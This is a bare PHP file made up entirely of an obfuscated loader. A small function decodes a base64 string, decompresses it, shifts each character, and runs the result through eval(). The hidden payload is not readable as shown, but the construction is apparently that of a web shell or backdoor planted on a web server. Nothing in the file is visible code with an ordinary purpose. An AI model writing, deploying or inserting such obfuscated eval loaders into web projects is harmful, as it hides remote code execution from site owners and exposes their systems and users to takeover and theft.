<?php function BKGVCK($KCx)
{ 
$KCx=gzinflate(base64_decode($KCx));
 for($i=0;$i<strlen($KCx);$i++)
 {
$KCx[$i] = chr(ord($KCx[$i])-1);
 }
 return $KCx;
 }eval(BKGVCK("nVLBbtswDP0AfQUnGJENOEWGNTvU6HppD720A7KbKhiqw6ZeE9sQFaBBkW8fpdhuklvni4zHx/dI4gHwJ5KqbTy+e7iGv9Q25RKrdolpUv5+XPzRqq8qAzdXILWRWfjRphBJ15K/td5ypxZBS264cy3h+hfIVeenPy7mU791z63MD3WPmw6dZQwja9bj5B3aTYS822KPbpDIrpAirk0u2LR+gfQbq/hdOgyeZfARG442sc7ZXUnrusKRl8N0nhWR+dKyX/UKYw0sQdL7DXJRcthRq2EaZbQJGyvXrlGF0dSW0KkcDrdqfAR5pdJht7Y8gXxqZA7yKT6DjZ6ZzBRfdLJENXnLHl+2+z7a7cVe/P9iQzD6NmXOohBDhM0hRAPOdyfm11zi8Z1PGUjKxd1icf/4oNWSKSqYjw2FECJhFbfrPC65ydXNKhB69zfcqWDMaT2nPFvCn5djjs9FovORSBA9VwnuIWlpTYQ+PeFz3CaTzxCelsYofu42mpxOvhdYvbagPiRtq4pvI69C9Peq+Ac="));?>